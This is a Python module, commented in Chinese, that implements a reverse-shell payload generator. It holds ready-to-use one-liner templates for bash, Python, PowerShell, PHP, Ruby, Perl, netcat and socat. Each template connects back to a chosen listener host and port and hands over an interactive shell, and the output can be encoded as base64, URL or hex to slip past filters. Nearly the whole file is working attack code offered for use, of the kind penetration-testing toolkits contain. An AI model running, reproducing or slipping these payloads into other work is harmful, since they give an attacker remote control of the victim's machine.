"""
Reverse Shell Generator Engine

提供多種語言的 Reverse Shell 生成功能
"""

import logging
from typing import Optional, Dict, Any
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class ReverseShellConfig:
    """Reverse Shell 配置"""
    language: str  # bash, python, powershell, php, etc.
    lhost: str
    lport: int
    encoding: Optional[str] = None


class ReverseShellGenerator:
    """Reverse Shell 生成器"""
    
    def __init__(self):
        """初始化 Reverse Shell 生成器"""
        self.templates = self._load_templates()
        logger.info("ReverseShellGenerator 已初始化")
    
    def _load_templates(self) -> Dict[str, str]:
        """載入 Reverse Shell 模板"""
        return {
            "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
            "powershell": "$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "netcat": "nc -e /bin/sh {lhost} {lport}",
            "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
        }
    
    def generate(self, config: ReverseShellConfig) -> Dict[str, Any]:
        """生成 Reverse Shell
        
        Args:
            config: Reverse Shell 配置
            
        Returns:
            生成結果
        """
        try:
            language = config.language.lower()
            
            if language not in self.templates:
                return {
                    "success": False,
                    "error": f"不支持的語言: {language}",
                    "supported_languages": list(self.templates.keys())
                }
            
            # 生成 payload
            template = self.templates[language]
            payload = template.format(lhost=config.lhost, lport=config.lport)
            
            # 應用編碼 (如果指定)
            if config.encoding:
                payload = self._encode_payload(payload, config.encoding)
            
            logger.info(f"成功生成 {language} Reverse Shell")
            
            return {
                "success": True,
                "payload": payload,
                "language": language,
                "lhost": config.lhost,
                "lport": config.lport,
                "encoding": config.encoding
            }
            
        except Exception as e:
            logger.error(f"生成 Reverse Shell 失敗: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """編碼 Payload
        
        Args:
            payload: 原始 payload
            encoding: 編碼方式 (base64, url, hex)
            
        Returns:
            編碼後的 payload
        """
        import base64
        import urllib.parse
        
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "hex":
            return payload.encode().hex()
        else:
            logger.warning(f"未知的編碼方式: {encoding}，返回原始 payload")
            return payload
    
    def list_supported_languages(self) -> list:
        """列出支持的語言"""
        return list(self.templates.keys())
